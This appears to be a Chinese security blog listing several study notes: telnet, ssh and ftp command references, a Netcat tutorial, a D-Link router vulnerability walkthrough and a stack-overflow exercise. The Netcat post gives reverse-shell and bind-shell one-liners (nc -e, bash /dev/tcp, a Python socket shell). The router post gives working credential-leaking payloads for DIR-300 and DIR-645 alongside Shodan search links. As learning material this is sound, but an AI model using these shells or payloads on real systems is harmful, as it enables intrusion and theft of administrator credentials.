<p>如果要配置允许登录的客户端列表，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only_from = 192.168.0.2 #只允许192.168.0.2登录</span><br></pre></td></tr></table></figure>
<p>如果要配置禁止登录的客户端列表，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no_access = 192.168.0.&#123;2,3,4&#125; #禁止192.168.0.2、192.168.0.3、192.168.0.4登录</span><br></pre></td></tr></table></figure>
<p>如果要设置开放时段，加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P）</span><br></pre></td></tr></table></figure>
<p>如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind = 192.168.0.2</span><br></pre></td></tr></table></figure>
<p>各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf）</p>
<p>配置端口，修改services文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/services</span><br></pre></td></tr></table></figure>
<p>找到以下两句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 23/tcp</span><br><span class="line">telnet 23/udp</span><br></pre></td></tr></table></figure>
<p>如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。</p>
<p>启动服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure>
<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>openssh套件中的客户端连接工具</p>
<p><strong>ssh命令</strong> 是openssh套件中的客户端连接工具，可以给予ssh加密协议实现安全的远程登录服务器。</p>
<p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh(选项)(参数)</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-1：强制使用ssh协议版本1；</span><br><span class="line">-2：强制使用ssh协议版本2；</span><br><span class="line">-4：强制使用IPv4地址；</span><br><span class="line">-6：强制使用IPv6地址；</span><br><span class="line">-A：开启认证代理连接转发功能；</span><br><span class="line">-a：关闭认证代理连接转发功能；</span><br><span class="line">-b：使用本机指定地址作为对应连接的源ip地址；</span><br><span class="line">-C：请求压缩所有数据；</span><br><span class="line">-F：指定ssh指令的配置文件；</span><br><span class="line">-f：后台执行ssh指令；</span><br><span class="line">-g：允许远程主机连接主机的转发端口；</span><br><span class="line">-i：指定身份文件；</span><br><span class="line">-l：指定连接远程服务器登录用户名；</span><br><span class="line">-N：不执行远程指令；</span><br><span class="line">-o：指定配置选项；</span><br><span class="line">-p：指定远程服务器上的端口；</span><br><span class="line">-q：静默模式；</span><br><span class="line">-X：开启X11转发功能；</span><br><span class="line">-x：关闭X11转发功能；</span><br><span class="line">-y：开启信任X11转发功能。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>远程主机：指定要连接的远程ssh服务器；</li>
<li>指令：要在远程ssh服务器上执行的指令。</li>
</ul>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ssh 用户名@远程服务器地址</span><br><span class="line">ssh user1@172.24.210.101</span><br><span class="line"># 指定端口</span><br><span class="line">ssh -p 2211 root@140.206.185.170</span><br><span class="line"></span><br><span class="line"># ssh 大家族</span><br><span class="line">ssh user@ip -p22 # 默认用户名为当前用户名，默认端口为 22</span><br><span class="line">ssh-keygen # 为当前用户生成 ssh 公钥 + 私钥</span><br><span class="line">ssh-keygen -f keyfile -i -m key_format -e -m key_format # key_format: RFC4716/SSH2(default) PKCS8 PEM</span><br><span class="line">ssh-copy-id user@ip:port # 将当前用户的公钥复制到需要 ssh 的服务器的 ~/.ssh/authorized_keys，之后可以免密登录</span><br></pre></td></tr></table></figure>
<h1 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h1><p>用来设置文件系统相关功能</p>
<p><strong>ftp命令</strong> 用来设置文件系统相关功能。ftp服务器在网上较为常见，Linux ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux ftp命令的一些经常使用的命令，相信掌握了这些使用Linux进行ftp操作将会非常容易。</p>
<p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp(选项)(参数)</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-d：详细显示指令执行过程，便于排错或分析程序执行的情况；</span><br><span class="line">-i：关闭互动模式，不询问任何问题；</span><br><span class="line">-g：关闭本地主机文件名称支持特殊字符的扩充特性；</span><br><span class="line">-n：不使用自动登录；</span><br><span class="line">-v：显示指令执行过程。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<p>主机：指定要连接的FTP服务器的主机名或ip地址。</p>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ascii  # 设定以ASCII方式传送文件(缺省值) </span><br><span class="line">ftp&gt; bell   # 每完成一次文件传送,报警提示. </span><br><span class="line">ftp&gt; binary # 设定以二进制方式传送文件. </span><br><span class="line">ftp&gt; bye    # 终止主机FTP进程,并退出FTP管理方式. </span><br><span class="line">ftp&gt; case   # 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母. </span><br><span class="line">ftp&gt; cd     # 同UNIX的CD命令. </span><br><span class="line">ftp&gt; cdup   # 返回上一级目录. </span><br><span class="line">ftp&gt; chmod  # 改变远端主机的文件权限. </span><br><span class="line">ftp&gt; close  # 终止远端的FTP进程,返回到FTP命令状态, 所有的宏定义都被删除. </span><br><span class="line">ftp&gt; delete # 删除远端主机中的文件. </span><br><span class="line">ftp&gt; dir [remote-directory] [local-file] # 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件. </span><br><span class="line">ftp&gt; get [remote-file] [local-file] # 从远端主机中传送至本地主机中. </span><br><span class="line">ftp&gt; help [command] # 输出命令的解释. </span><br><span class="line">ftp&gt; lcd # 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录. </span><br><span class="line">ftp&gt; ls [remote-directory] [local-file] # 同DIR. </span><br><span class="line">ftp&gt; macdef                 # 定义宏命令. </span><br><span class="line">ftp&gt; mdelete [remote-files] # 删除一批文件. </span><br><span class="line">ftp&gt; mget [remote-files]    # 从远端主机接收一批文件至本地主机. </span><br><span class="line">ftp&gt; mkdir directory-name   # 在远端主机中建立目录. </span><br><span class="line">ftp&gt; mput local-files # 将本地主机中一批文件传送至远端主机. </span><br><span class="line">ftp&gt; open host [port] # 重新建立一个新的连接. </span><br><span class="line">ftp&gt; prompt           # 交互提示模式. </span><br><span class="line">ftp&gt; put local-file [remote-file] # 将本地一个文件传送至远端主机中. </span><br><span class="line">ftp&gt; pwd  # 列出当前远端主机目录. </span><br><span class="line">ftp&gt; quit # 同BYE. </span><br><span class="line">ftp&gt; recv remote-file [local-file] # 同GET. </span><br><span class="line">ftp&gt; rename [from] [to]     # 改变远端主机中的文件名. </span><br><span class="line">ftp&gt; rmdir directory-name   # 删除远端主机中的目录. </span><br><span class="line">ftp&gt; send local-file [remote-file] # 同PUT. </span><br><span class="line">ftp&gt; status   # 显示当前FTP的状态. </span><br><span class="line">ftp&gt; system   # 显示远端主机系统类型. </span><br><span class="line">ftp&gt; user user-name [password] [account] # 重新以别的用户名登录远端主机. </span><br><span class="line">ftp&gt; ? [command] # 同HELP. [command]指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。</span><br><span class="line">ftp&gt; ! # 从 ftp 子系统退出到外壳。</span><br></pre></td></tr></table></figure>
<p>关闭FTP连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bye</span><br><span class="line">exit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p>下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get readme.txt # 下载 readme.txt 文件</span><br><span class="line">ftp&gt; mget *.txt     # 下载</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put /path/readme.txt # 上传 readme.txt 文件</span><br><span class="line">ftp&gt; mput *.txt           # 可以上传多个文件</span><br></pre></td></tr></table></figure>
<p>内容来自【<a href="https://wangchujiang.com/linux-command/c/ssh.html】" target="_blank" rel="noopener">https://wangchujiang.com/linux-command/c/ssh.html】</a></p>
<p>整理为笔记以记之</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Tools/">Tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/03/Netcat-工具使用/"><span>Netcat 工具使用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/03/Netcat-工具使用/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-03T15:06:06.000Z">
          2018-12-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h4 id="Netcat的工具使用总结："><a href="#Netcat的工具使用总结：" class="headerlink" title="Netcat的工具使用总结："></a>Netcat的工具使用总结：</h4><p>一，Netcat Banner获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port]</span><br></pre></td></tr></table></figure>
<p>二，文件传输</p>
<p>例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888 &gt; 文件路径</span><br></pre></td></tr></table></figure>
<p>在攻击机上，我们连接到该8888端口并发送文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] &lt; 文件路径</span><br></pre></td></tr></table></figure>
<p>三，Bind Shells &amp;Reverse Shells</p>
<p>在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
<p>Reverse Shell:</p>
<p>1.设置一个Netcat侦听器，（我们侦听端口8888）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
<p>2.接下来我们在目标主机上执行下面的命令来连接我们的攻击主机（记住我们在这个攻击主机上执行了远程代码）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] -e /bin/bash    &lt;for linux&gt;</span><br><span class="line">nc.exe [ip-address] [port] -e cmd.exe  &lt;for windows&gt;</span><br></pre></td></tr></table></figure>
<p>若目标主机没有Netcat，我们使用其他方法来代替</p>
<p>Bash反向shell，使用Bash通过使用以下命令从目标主机启动反向shell连接攻击主机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp;/dev/tcp/[ip-address]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>python反向shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c’import socket，subprocess，os; s = socket.socket(socket.AF_INET，socket.SOCK_STREAM); s.connect((“[ip-address]”，[port])); os.dup2（s.fileno()，0); os.dup2(s.fileno()，1); os.dup2(s.fileno()，2); P = subprocess.call([“/ bin / sh”，” - i”]);”</span><br></pre></td></tr></table></figure>
<p>Bind Shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attacker:nc [ip-address] [port]</span><br><span class="line">Target:  nc -lvp [port] -e /bin/sh</span><br></pre></td></tr></table></figure>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Tools/">Tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/11/01/路由器漏洞挖掘入门/"><span>路由器漏洞挖掘入门</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/11/01/路由器漏洞挖掘入门/" rel="bookmark">
        <time class="entry-date published" datetime="2018-11-01T15:19:08.000Z">
          2018-11-01
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>周末在家闲着，也趁着这个时间来入门学习下路由器漏洞挖掘！网上查阅的D-Link系列的漏洞也不少，那就从D-Link路由器漏洞开始学习，顺便刚好也好跟着<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">创宇paper</a>学习，就当是学习笔记了！</p>
<h4 id="一：准备工作"><a href="#一：准备工作" class="headerlink" title="一：准备工作"></a>一：准备工作</h4><ul>
<li><code>binwalk</code>:用来解开固件包</li>
<li>路由器的固件：<a href="ftp://ftp2.dlink.com/PRODUCTS/" target="_blank" rel="noopener">ftp://ftp2.dlink.com/PRODUCTS/</a></li>
</ul>
<p>完成<code>binwalk</code>的安装后，”<code>binwalk -Me</code> 固件包名称”来解相对应的固件。</p>
<h4 id="二：漏洞挖掘"><a href="#二：漏洞挖掘" class="headerlink" title="二：漏洞挖掘"></a>二：漏洞挖掘</h4><p>D-Link DIR-300 信息泄露漏洞</p>
<p><a href="https://www.shodan.io/search?query=DIR-300" target="_blank" rel="noopener">shodan :DIR-300</a></p>
<p>我们先下载<code>D-Link DIR-300</code>的固件并且解固件</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/1.PNG" alt=""></p>
<p>在解固件之后，进入 <code>suashfs-root/www</code> 文件夹，漏洞出现在<code>/model/__show_info.php</code>文件。</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/2.PNG" alt=""></p>
<p>这里看到已经禁止了<code>$REQUIRE_FILE</code>的参数为<code>var/etc/httpasswd</code>和<code>var/etc/hnapasswd</code>。这样的话看起来我们是无法获取账号密码的。那如果我们从根路径开始配置<code>httpasswd</code>的路径，那么是不是就可以绕过这个过滤了呢！</p>
<p>payload：（<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">创宇</a>）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/model/__show_info.php?REQUIRE_FILE=/<span class="keyword">var</span>/etc/httpasswd</span><br></pre></td></tr></table></figure>
<p>这里设置<code>REQUIRE_FILE=/var/etc/httpasswd</code> 成功绕过上面的 <code>if</code>判断，进行任意文件读取。</p>
<p>D-Link DIR-645信息泄露漏洞</p>
<p><a href="https://www.shodan.io/search?query=DIR-645" target="_blank" rel="noopener">shodan:DIR-645</a></p>
<p>同样该漏洞出现在 <code>suashfs-root/htdocs</code> 文件夹<code>getcfg.php</code> 文件由于过滤不严格导致信息泄露漏洞</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/5.PNG" alt=""></p>
<p>该代码中 <code>$GETCFG_SVC</code> 没有任何过滤直接获取了 POST 传递过来的<code>SERVICES</code>的值。如果<code>$GETCFG_SVC</code>不为空，则进行文件读取。这里我们就可以读取存储此设备信息的<code>DEVICE.ACCOUNT.xml.php</code>文件。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/getcfg.php</span><br><span class="line">post:SERVICES=DEVICE.ACCOUNT</span><br></pre></td></tr></table></figure>
<p>说了这么久了，实战走一波吧！</p>
<p>进入D-Link DIR-645的web登录页面，则显示需要用户与密码则可登录，那么接下来我们来获取他们</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/6.PNG" alt=""></p>
<p>利用payload打一波</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/3.PNG" alt=""></p>
<p>果然，我们可以清楚地看到账号密码，继续登录验证，登录成功</p>
<p><img src="/2018/11/01/路由器漏洞挖掘入门/4.PNG" alt=""></p>
<h4 id="三：参考"><a href="#三：参考" class="headerlink" title="三：参考"></a>三：参考</h4><p>【1】<a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf" target="_blank" rel="noopener">.http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf</a></p>
<p>【2】<a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">https://paper.seebug.org/429/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/漏洞挖掘/">漏洞挖掘</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/28/栈溢出学习笔记/"><span>栈溢出学习笔记</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/28/栈溢出学习笔记/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-28T10:19:40.000Z">
          2018-10-28
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在上一篇博客中对栈溢出的相关原理进行了浅析，接下来我找了个实例来进一步来加强理解，首先我们来看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"> <span class="keyword">int</span> r;</span><br><span class="line"> r = read(<span class="number">0</span>, buf, <span class="number">400</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\nRead %d bytes. buf is %s\n"</span>, r, buf);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">"No shell for you :("</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Try to exec /bin/sh"</span>);</span><br><span class="line"> vuln();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>操作系统提供了许多安全机制来试图降低或阻止缓冲区溢出攻击带来的安全风险，包括<code>DEP、ASLR</code>等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了<code>DEP</code>（<code>Linux</code>下对应<code>NX</code>）、<code>ASLR</code>（<code>Linux</code>下对应<code>PIE</code>）等机制，例如存在<code>DEP</code>（<code>NX</code>）的话就不能直接执行栈上的数据，存在<code>ASLR</code>的话各个系统调用的地址就是随机化的。所以在编译之前，首先要来关闭掉<code>linux</code>系统栈保护机制。</p>
<p>学习下相关的保护机制，<code>checksec</code>工具可以来检查各个保护机制是否打开</p>
<p><img src="/2018/10/28/栈溢出学习笔记/1.PNG" alt=""></p>
<p>依次来看看上图中的各个保护机制，这个具体可参考（<a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">上善若水的博客</a>），下面应用一部分当学习笔记记录吧：</p>
<ul>
<li><p><code>CANNARY</code>(栈保护)：上图中表示栈保护功能开启，栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让自己已经设计好的<code>shellcode</code>得到执行。而当启用栈保护后，函数开始执行的时候会先往栈里插入<code>cookie</code>信息，当函数真正返回的时候会验证<code>cookie</code>信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将<code>cookie</code>信息给覆盖掉，导致栈保护检查失败而阻止<code>shellcode</code>的执行。在<code>Linux</code>中我们将<code>cookie</code>信息称为<code>CANARY</code>。</p>
</li>
<li><p><code>FORTIFY</code>:<code>FORTIFY</code>其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets</code>以及宽字符的变体。</p>
</li>
<li><p><code>NX(DEP)</code>:<code>NX</code>（<code>No-eXecute</code>）即为不可执行的意思，基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时<code>CPU</code>就会抛出异常，而不是去执行恶意指令。</p>
<p>工作原理如图：</p>
<p><img src="/2018/10/28/栈溢出学习笔记/2.PNG" alt=""></p>
</li>
<li><p><code>PIE(ASLR)</code>:一般情况下<code>NX</code>（<code>Windows</code>平台上称其为<code>DEP</code>）和地址空间分布随机化（<code>ASLR</code>）会同时工作。内存地址随机化机制（<code>address space layout randomization</code>)，有以下三种情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
<p>可以防范基于<code>Ret2libc</code>方式的针对<code>DEP</code>的攻击。<code>ASLR</code>和<code>DEP</code>配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
</li>
<li><p><code>RELRO</code>:在<code>Linux</code>系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p>
<p><code>GCC, GNU linker</code>以及<code>Glibc-dynamic linker</code>一起配合实现了一种叫做<code>relro</code>的技术: <code>read only relocation</code>。大概实现就是由linker指定binary的一块经过<code>dynamic linker</code>处理过 <code>relocation</code>之后的区域为只读.</p>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对<code>GOT（Global Offset Table）</code>攻击。<code>RELRO</code>为” <code>Partial RELRO</code>”，说明我们对<code>GOT</code>表具有写权限。</p>
</li>
</ul>
<p>在利用程序在编译之前我们首先要关闭系统的<code>ASLR</code> 方法，<code>checksec</code>如下 所以：</p>
<p><img src="/2018/10/28/栈溢出学习笔记/3.PNG" alt=""></p>
<p>接下来，我们要如何利用该程序的漏洞呢，所以要做的是覆盖返回地址，即覆盖掉栈中的返回地址，从而让指令寄存器去执行我之前设定好的<code>shellcode</code>,在之前，我们先看下该段代码的反汇编代码</p>
<p><img src="/2018/10/28/栈溢出学习笔记/4.PNG" alt=""></p>
<p>该段程序当<code>read()</code>将<code>400</code>字节复制到一个<code>80</code>字节的<code>buffer</code>时，显然存在缓冲区溢出，下面我们构造我们的<code>exp</code>,来看看是否能够覆盖<code>RIP</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">buf = <span class="string">""</span></span><br><span class="line">buf += <span class="string">"A"</span>*<span class="number">400</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"in.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line">f.write(buf)</span><br></pre></td></tr></table></figure>
<p>我们将利用这个<code>exp</code>来创建一个含有400个”A” 字符的”<code>in.txt</code>“文件，并且将典例加载进gdb并将in.txt的内容重定向到典例中</p>
<p><img src="/2018/10/28/栈溢出学习笔记/6.PNG" alt=""></p>
<p>程序显然崩掉了，但是却没有覆盖到<code>RIP</code>,因为我们已覆盖的<code>RIP</code>带有一个无效地址，事实上我们没控制到<code>RIP</code>,为了控制<code>RIP</code>，我们需要用<code>0x0000414141414141</code>覆盖(代替)它，因此真正的目标是找到覆盖了<code>RIP</code>的偏移（带有一个非标准地址）。我们可以使用一种<code>cyclic</code>模板找到这个偏移，并且再次运行检查<code>RSP</code>的内容，最后便可以看到偏移</p>
<p><img src="/2018/10/28/栈溢出学习笔记/7.PNG" alt=""></p>
<p>因此,<code>RIP</code>在偏移<code>104</code>上.让我们重新构造我们的<code>exp</code>并看看我们这次是否可以覆盖<code>RIP</code>:</p>
<p><img src="/2018/10/28/栈溢出学习笔记/8.PNG" alt=""></p>
<p>很棒,我们已经彻底控制了RIP。最后，我们可以继续构造我们的<code>shellcode</code>。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/逆向/">逆向</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/21/栈溢出浅析/"><span>栈溢出浅析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/21/栈溢出浅析/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-21T04:00:31.000Z">
          2018-10-21
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><code>To be the apostrophe which changed“ Impossible” into“ I’ m possible”</code>                                <code>——Failwest</code></p>
<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h3><p>每周末最起码得写点东西吧，算是给自己的笔记吧，要不然怎么对得起这两天<code>free time</code>呢! 所以这篇就诞生了：）</p>
